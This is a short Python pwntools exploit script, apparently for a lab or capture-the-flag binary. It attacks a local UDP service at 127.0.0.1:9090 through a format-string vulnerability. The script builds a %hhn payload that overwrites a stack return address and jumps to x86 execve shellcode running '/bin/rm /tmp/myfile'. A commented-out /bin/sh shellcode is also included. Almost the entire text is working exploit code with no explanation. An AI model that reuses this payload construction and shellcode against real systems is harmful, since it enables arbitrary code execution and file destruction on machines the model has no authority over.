from sys import *
from pwn import *

context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','sh','-c']

io = remote("127.0.0.1",9090,typ='udp')
#io = process('./vul')

# /bin/bash -c "/bin/rm /tmp/myfile"
shellcode = "1\xc0Phbashh////h/bin\x89\xe31\xc0Ph-ccc\x89\xe01\xd2Rhile h/myfh/tmph/rm h/bin\x89\xe21\xc9QRPS\x89\xe11\xd21\xc0\xb0\x0b\xcd\x80"
# execve("/bin/sh",0,0)
#shellcode ="1\xc0Ph//shh/bin\x89\xe3PS\x89\xe1\x99\xb0\x0b\xcd\x80\x00"
#print len(shellcode)

#shellcode_addr = 0xbfffe7c0 + 0x40
shellcode_addr = 0xbfffe820

# 1. rewrite ret_addr to shellcode_addr
#ret_addr = 0xbfffe79c
ret_addr = 0xbfffe79c

payload = p32(ret_addr) 
payload += p32(ret_addr+1)
payload += p32(ret_addr+2)
payload += p32(ret_addr+3)
payload += "%{}c".format(((shellcode_addr&0xff)-16+256)&0xff) 
payload += "%24$hhn"
payload += "%{}c".format((((shellcode_addr>>8)&0xff)-(shellcode_addr&0xff)+256)&0xff)
payload += "%25$hhn"
payload += "%{}c".format((((shellcode_addr>>16)&0xff)-((shellcode_addr>>8)&0xff)+256)&0xff)
payload += "%26$hhn"
payload += "%{}c".format((((shellcode_addr>>24)&0xff)-((shellcode_addr>>16)&0xff)+256)&0xff)
payload += "%27$hhnaa"

print len(payload)

#p = fmtstr_payload( 24, {ret_addr:shellcode_addr} ) + 'aa'
#print p==payload
payload += shellcode

print payload
pause()
io.sendline(payload)

io.interactive() 
